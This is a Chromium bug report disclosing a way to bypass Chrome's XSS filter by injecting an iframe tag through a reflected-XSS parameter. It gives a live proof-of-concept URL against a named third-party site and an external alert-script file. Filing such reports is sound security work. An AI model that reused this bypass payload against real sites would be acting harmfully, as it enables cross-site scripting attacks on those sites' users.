<title>Issue 34438 -   chromium -    null-domain reflected XSS: XSS filter bypassing through &lt;iframe&gt; tag injecting - Project Hosting on Google Code</title> <pre> It is possible to bypass Chrome's XSS filter by injecting inline frame tag   with 'src' attribute targeted to malicious content.    Live example: <a href="http://moneywinner.ru/?">http://moneywinner.ru/?</a>  user=%22%3E%3Ciframe%20src=<a href="http://files.rsdn.ru/24665/ci.html%3E">http://files.rsdn.ru/24665/ci.html%3E</a>    Where moneywinner.ru is the vulnerable to reflected XSS's webapp through   html-injection via 'user' GET-param and ci.html is our malicious content   file with:     &lt;script&gt;alert('XSS!')&lt;/script&gt;alert('XSS!')&lt;/script&gt;    This issue applicable to the Chrome v5.0.307.1 dev and (possible) to all   previous versions.           </pre>
